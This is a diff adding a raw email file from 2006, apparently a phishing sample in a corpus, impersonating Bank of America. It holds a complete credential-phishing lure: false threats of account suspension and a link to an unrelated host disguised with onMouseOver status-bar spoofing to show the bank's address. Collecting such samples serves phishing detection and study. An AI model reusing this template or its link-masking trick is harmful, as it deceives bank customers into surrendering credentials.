@@ -1,0 +1,63 @@
+From nobody Sun Jan 25 13:49:59 2015
+Return-Path: <nobody@jimi.springsips.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id 987C446BC2
+ for <user@login.example.com>; Sun, 17 Sep 2006 20:47:38 -0400 (EDT)
+Received: from jimi.springsips.com (jimi.springsips.com [204.10.248.8])
+ by mail.example.org (Postfix) with ESMTP id AE0C56CD158
+ for <user@example.com>; Sun, 17 Sep 2006 20:47:38 -0400 (EDT)
+Received: from jimi.springsips.com (localhost [127.0.0.1])
+ by jimi.springsips.com (8.12.6/8.12.6) with ESMTP id k8I0lex5047652
+ for <user@example.com>; Sun, 17 Sep 2006 18:47:40 -0600 (MDT)
+ (envelope-from nobody@jimi.springsips.com)
+Received: (from nobody@localhost)
+ by jimi.springsips.com (8.12.6/8.12.6/Submit) id k8I0letQ047651;
+ Sun, 17 Sep 2006 18:47:40 -0600 (MDT)
+Date: Sun, 17 Sep 2006 18:47:40 -0600 (MDT)
+Message-Id: <200609180047.k8I0letQ047651@jimi.springsips.com>
+X-Authentication-Warning: jimi.springsips.com: Processed from queue
+ /var/spool/clientmqueue
+To: user@example.com
+Subject: Bank of America Alert: update Your Account Information
+From: <onlinebanking@alert.bankofamerica.com>
+Reply-To: 
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 264
+
+<b>Dear Bank of America valued member</b>,<br>
+<br>
+Due to concerns regarding your recent activites involving your account and for the safety and integrity of the online<br> banking
+community we have issued this warning message. <br>
+<br>
+It has come to our attention that your account information needs
+<br>to be updated due to inactive member status, frauds and/or spoof reports.<br>
+We will appreciate if you could spend several minutes out of your online experience and 
+renew<br> your
+records to prevent your account running into future problems or even failure with the online 
+service.<br>
+However, failure to update your records will result in temporary/permanent account 
+suspension.<br>
+This notification expires Sept 17, 2006.<br>
+<br>
+Once you have updated your account records your internet banking<br> service will not be
+interrupted and will continue as normal.
+<br>
+<br>Just follow the link below <br>
+<i></i> and
+renew your account information.
+<br><a 
+href="http://enableit.virtuozzo.co.nz/~testing/www.bankofamerica.com//online_bofa_banking/e-online-banking/"onMouseOver="status='http://www.bankofamerica.com'; return true" 
+onMouseOut="status='';return 
+true">http://www.bankofamerica.com
+<p><img src="http://content.edgar-online.com/edgar_conv_img/2005/01/18/0001193125-05-007318_G57116STAMP15.JPG"
+ alt="Bank of America" width="140" height="110">
+<br>
+
+
